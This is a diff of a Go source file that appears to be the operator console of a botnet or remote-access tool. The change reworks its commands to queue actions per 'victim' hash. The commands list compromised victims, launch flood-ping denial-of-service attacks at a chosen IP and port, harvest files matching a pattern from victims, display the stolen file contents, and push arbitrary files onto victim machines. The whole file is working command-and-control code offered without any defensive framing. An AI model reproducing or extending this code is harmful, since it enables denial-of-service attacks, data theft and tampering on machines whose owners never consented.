@@ -1,151 +1,150 @@
 package main
 
 import (
-	"bytes"
+	//"bytes"
 	"encoding/base64"
-	"encoding/json"
+	//"encoding/json"
 	"fmt"
-	"net/http"
+	//"net/http"
 	"os"
 	"path/filepath"
+	"sync"
 	"time"
 )
+
+var clientTreeMutex sync.Mutex
 
 // edit later
 var options = []option{
 	{"/help", 0, specificHelp},
 	{"/clear", 0, CallClear},
 	{"/exit", 0, exitFunction},
-	{"/list", 0, nil},
+	{"/list", 0, listVictims},
 	{"/floodping", -1, floodping},
 	{"/supercat", -1, supercat},
 	{"/writefile", -1, writefile},
+	{"/showsupercat", -1, showSuperCat},
+}
+
+func listVictims(params ...interface{}) {
+	clientTreeMutex.Lock()
+	defer clientTreeMutex.Unlock()
+
+	if clientTree.Size() == 0 {
+		fmt.Println("No registered victims found.")
+		return
+	}
+
+	it := clientTree.Iterator()
+	for it.Next() {
+		hash := it.Key().(string)
+		victim := it.Value().(VictimInfo)
+
+		fmt.Printf("- Hash: %s\n", hash)
+
+		if len(victim.Commands) == 0 {
+			fmt.Println("  No queued commands.")
+		} else {
+			for i, cmd := range victim.Commands {
+				fmt.Printf("  [%d] CommandType: %s, Args: %v\n",
+					i+1, cmd.Commandytype, cmd.Arguments)
+			}
+		}
+
+		fmt.Println() // spacing between victims
+	}
+}
+
+func showSuperCat(params ...interface{}) {
+	args, ok := params[0].([]string)
+	if !ok || len(args) != 1 {
+		fmt.Println("Usage: /showsupercat <victimHash>")
+		return
+	}
+
+	hash := args[0]
+
+	superCatMutex.Lock()
+	defer superCatMutex.Unlock()
+
+	val, found := superCatTree.Get(hash)
+	if !found {
+		fmt.Println("No supercat data found for:", hash)
+		return
+	}
+
+	entries := val.([]IncomingSuperCatData)
+	for _, entry := range entries {
+		fmt.Printf("Filename: %s\nContent:\n%s\n\n", entry.Filename, entry.Content)
+	}
 }
 
 func floodping(params ...interface{}) {
-	paramsForFloodPing, ok1 := params[0].([]string)
-	if !ok1 || len(paramsForFloodPing) < 2 {
-		fmt.Println("floodping requires a IP and port")
-		return
-	}
-	ipport := paramsForFloodPing[0] + ":" + paramsForFloodPing[1]
-
-	data := comData{
-		Cmd:  "floodping",
-		Data: ipport,
-	}
-
-	jsondata, err := json.Marshal(data)
-
-	if err != nil {
-		fmt.Println("There was an error: ", err)
+	args, ok := params[0].([]string)
+	if !ok || len(args) < 3 {
+		fmt.Println("Usage: /floodping <victimHash> <ip> <port>")
 		return
 	}
 
-	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
+	hash := args[0]
+	ipport := args[1] + ":" + args[2]
 
-	if err != nil {
-		fmt.Println("There was an error: ", err)
-		return
+	cmd := VictimCommand{
+		Commandytype: "floodping",
+		Arguments:    []string{ipport},
 	}
 
-	defer response.Body.Close()
-
-	if response.StatusCode == http.StatusOK {
-		fmt.Println("Response success:", response.Status)
-	} else {
-		fmt.Println("Response Failed:", response.Status)
-	}
+	AddCommandToVictim(hash, cmd)
 
 }
 
 func supercat(params ...interface{}) {
-	paramsForSupercat, ok1 := params[0].([]string)
-	if !ok1 || len(paramsForSupercat) < 1 {
-		fmt.Println("supercat requires at least 1 file pattern")
-		return
-	}
-	fileglob := paramsForSupercat[0]
-
-	data := comData{
-		Cmd:  "supercat",
-		Data: fileglob,
-	}
-
-	jsondata, err := json.Marshal(data)
-
-	if err != nil {
-		fmt.Println("There was an error: ", err)
+	args, ok := params[0].([]string)
+	if !ok || len(args) < 2 {
+		fmt.Println("Usage: /supercat <victimHash> <filePattern>")
 		return
 	}
 
-	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
+	hash := args[0]
+	fileglob := args[1]
 
-	if err != nil {
-		fmt.Println("There was an error: ", err)
-		return
+	cmd := VictimCommand{
+		Commandytype: "supercat",
+		Arguments:    []string{fileglob},
 	}
 
-	defer response.Body.Close()
-
-	if response.StatusCode == http.StatusOK {
-		fmt.Println("Response success:", response.Status)
-	} else {
-		fmt.Println("Response Failed:", response.Status)
-	}
+	AddCommandToVictim(hash, cmd)
 
 }
 
 func writefile(params ...interface{}) {
-	paramsWritefile, ok := params[0].([]string)
-	if !ok || len(paramsWritefile) < 1 {
-		fmt.Println("writefile requires at least 1 file filename")
+	args, ok := params[0].([]string)
+	if !ok || len(args) < 2 {
+		fmt.Println("Usage: /writefile <victimHash> <file1> [file2] ...")
 		return
 	}
 
-	type filePayload struct {
-		Filename string `json:"filename"`
-		Content  string `json:"content"`
-	}
+	hash := args[0]
+	files := args[1:]
 
-	filesData := []filePayload{}
-
-	for _, filename := range paramsWritefile {
-		contents, err := os.ReadFile(filename)
+	for _, filename := range files {
+		content, err := os.ReadFile(filename)
 		if err != nil {
 			fmt.Printf("Can't read %s, error: %v\n", filename, err)
 			continue
 		}
-		filesData = append(filesData, filePayload{
-			Filename: filepath.Base(filename),
-			Content:  base64.StdEncoding.EncodeToString(contents),
-		})
+
+		cmd := VictimCommand{
+			Commandytype: "writefile",
+			Arguments: []string{
+				filepath.Base(filename),
+				base64.StdEncoding.EncodeToString(content),
+			},
+		}
+
+		AddCommandToVictim(hash, cmd)
 	}
 
-	data := map[string]interface{}{
-		"cmd":  "writefile",
-		"file": filesData,
-	}
-
-	jsondata, err := json.Marshal(data)
-	if err != nil {
-		fmt.Println("There is an error:", err)
-		return
-	}
-
-	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
-	if err != nil {
-		fmt.Println("There is an error:", err)
-		return
-	}
-
-	defer response.Body.Close()
-
-	if response.StatusCode == http.StatusOK {
-		fmt.Println("Response success:", response.Status)
-	} else {
-		fmt.Println("Response Failed:", response.Status)
-	}
 }
 
 // exits the program
